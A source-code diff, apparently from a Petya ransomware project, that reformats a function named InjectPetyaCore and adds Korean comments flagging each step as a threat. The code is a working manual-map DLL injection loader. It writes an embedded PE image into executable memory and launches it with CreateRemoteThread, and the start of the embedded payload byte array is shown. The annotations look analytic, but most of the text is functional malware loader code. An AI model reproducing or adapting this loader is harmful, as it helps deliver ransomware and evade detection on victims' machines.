@@ -1,75 +1,92 @@
 #include <Windows.h>
 #include "misc.h"
 #include "bin.h"
+. 
+// 이 코드는 타깃 프로세스에 악성 DLL을 로드하여 실행하는 방식으로 동작함.
+// 주요 위협: 
+// 1. DLL Injection을 통해 악성 코드를 실행, 시스템 권한 상승 및 중요 데이터를 탈취 가능.
+// 2. 악성 코드 실행을 은닉하여 탐지를 우회하는 데 사용될 수 있음.
+// 3. 악성 동작(랜섬웨어, 키로거 등)을 수행하는 페이로드를 전달함.
+
+// 메모리 매핑 방식으로 DLL을 주입하여 타깃 프로세스의 컨텍스트 내에서 악성 코드가 실행됨. -> 탐지 우회와 권한 상승 가능할것으로 보임.
 
 VOID
-InjectPetyaCore(
-
-)
+InjectPetyaCore()
 {
-	//Thanks to https://github.com/Zer0Mem0ry/ManualMap
+    // Thanks to https://github.com/Zer0Mem0ry/ManualMap
+    // 메모리 매핑 방식으로 DLL을 프로세스에 수동 로드하는 구현.
 
-	loaderdata LoaderParams;
+    loaderdata LoaderParams;
 
+    // 타깃 DLL의 DOS 헤더
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)SetupDLL;
+    // 타깃 DLL의 NT 헤더
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)SetupDLL + pDosHeader->e_lfanew);
 
-	// Target Dll's DOS Header
-	PIMAGE_DOS_HEADER pDosHeader = ( PIMAGE_DOS_HEADER )SetupDLL;
-	// Target Dll's NT Headers
-	PIMAGE_NT_HEADERS pNtHeaders = ( PIMAGE_NT_HEADERS )( ( LPBYTE )SetupDLL + pDosHeader->e_lfanew );
+    // 현재 프로세스 핸들 획득
+    // 위협: 악성 DLL이 실행되는 프로세스의 컨텍스트를 사용하여 권한 상승 가능.
+    HANDLE hProcess = GetCurrentProcess();
 
-	// Opening target process.
-	HANDLE hProcess = GetCurrentProcess( );
-	// Allocating memory for the DLL
-	PVOID ExecutableImage = VirtualAllocEx( hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
-		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+    // DLL을 로드할 메모리 공간 할당
+    // 위협: 실행 가능한 메모리 영역에 악성 코드를 주입하여 탐지 우회.
+    PVOID ExecutableImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
+                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	// Copy the headers to target process
-	WriteProcessMemory( hProcess, ExecutableImage, SetupDLL,
-		pNtHeaders->OptionalHeader.SizeOfHeaders, NULL );
+    // 타깃 프로세스에 DLL 헤더 복사
+    WriteProcessMemory(hProcess, ExecutableImage, SetupDLL,
+                       pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
-	// Target Dll's Section Header
-	PIMAGE_SECTION_HEADER pSectHeader = ( PIMAGE_SECTION_HEADER )( pNtHeaders + 1 );
-	// Copying sections of the dll to the target process
-	for ( int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++ )
-	{
-		WriteProcessMemory( hProcess, ( PVOID )( ( LPBYTE )ExecutableImage + pSectHeader[ i ].VirtualAddress ),
-			( PVOID )( ( LPBYTE )SetupDLL + pSectHeader[ i ].PointerToRawData ), pSectHeader[ i ].SizeOfRawData, NULL );
-	}
+    // 타깃 DLL의 섹션 헤더
+    PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
+    // DLL의 섹션 데이터를 타깃 프로세스에 복사
+    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+    {
+        WriteProcessMemory(hProcess, 
+            (PVOID)((LPBYTE)ExecutableImage + pSectHeader[i].VirtualAddress),
+            (PVOID)((LPBYTE)SetupDLL + pSectHeader[i].PointerToRawData), 
+            pSectHeader[i].SizeOfRawData, NULL);
+    }
 
-	// Allocating memory for the loader code.
-	PVOID LoaderMemory = VirtualAllocEx( hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
-		PAGE_EXECUTE_READWRITE ); // Allocate memory for the loader code
+    // 로더 코드를 위한 메모리 공간 할당
+    PVOID LoaderMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
+                                        PAGE_EXECUTE_READWRITE); // 위협: 실행 가능한 코드 삽입.
 
-	LoaderParams.ImageBase = ExecutableImage;
-	LoaderParams.NtHeaders = ( PIMAGE_NT_HEADERS )( ( LPBYTE )ExecutableImage + pDosHeader->e_lfanew );
+    // 로더 파라미터 설정
+    LoaderParams.ImageBase = ExecutableImage;
+    LoaderParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)ExecutableImage + pDosHeader->e_lfanew);
+    LoaderParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)ExecutableImage
+        + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+    LoaderParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ExecutableImage
+        + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    LoaderParams.fnLoadLibraryA = LoadLibraryA;
+    LoaderParams.fnGetProcAddress = GetProcAddress;
 
-	LoaderParams.BaseReloc = ( PIMAGE_BASE_RELOCATION )( ( LPBYTE )ExecutableImage
-		+ pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].VirtualAddress );
-	LoaderParams.ImportDirectory = ( PIMAGE_IMPORT_DESCRIPTOR )( ( LPBYTE )ExecutableImage
-		+ pNtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress );
+    // 로더 데이터를 타깃 프로세스에 복사
+    WriteProcessMemory(hProcess, LoaderMemory, &LoaderParams, sizeof(loaderdata), NULL);
 
-	LoaderParams.fnLoadLibraryA = LoadLibraryA;
-	LoaderParams.fnGetProcAddress = GetProcAddress;
+    // 로더 코드를 타깃 프로세스에 복사
+    WriteProcessMemory(hProcess, (PVOID)((loaderdata*)LoaderMemory + 1), LibraryLoader,
+                       (DWORD)stub - (DWORD)LibraryLoader, NULL);
 
-	// Write the loader information to target process
-	WriteProcessMemory( hProcess, LoaderMemory, &LoaderParams, sizeof( loaderdata ),
-		NULL );
-	// Write the loader code to target process
-	WriteProcessMemory( hProcess, ( PVOID )( ( loaderdata* )LoaderMemory + 1 ), LibraryLoader,
-		( DWORD )stub - ( DWORD )LibraryLoader, NULL );
-	// Create a remote thread to execute the loader code
-	HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )( ( loaderdata* )LoaderMemory + 1 ),
-		LoaderMemory, 0, NULL );
+    // 타깃 프로세스에서 로더 코드를 실행하는 스레드 생성
+    // 위협: 스레드를 통해 악성 페이로드 실행.
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
+                                        (LPTHREAD_START_ROUTINE)((loaderdata*)LoaderMemory + 1),
+                                        LoaderMemory, 0, NULL);
 
-	// Wait for the loader to finish executing
-	WaitForSingleObject( hThread, INFINITE );
+    // 로더 코드 실행 대기
+    WaitForSingleObject(hThread, INFINITE);
 
-	// free the allocated loader code
-	VirtualFreeEx( hProcess, LoaderMemory, 0, MEM_RELEASE );
-
+    // 사용된 로더 메모리 해제
+    VirtualFreeEx(hProcess, LoaderMemory, 0, MEM_RELEASE);
 }
 
-UCHAR SetupDLL[ ] = {
+// 악성 DLL 데이터 (SetupDLL)는 실제 악성 코드를 포함함. 길이 제한으로 생략.
+UCHAR SetupDLL[] = {
+    // 악성 페이로드가 이 배열에 포함됨. 
+    // 암호화되거나 난독화된 상태로 저장될 가능성이 높음.
+
+
 	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
 	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
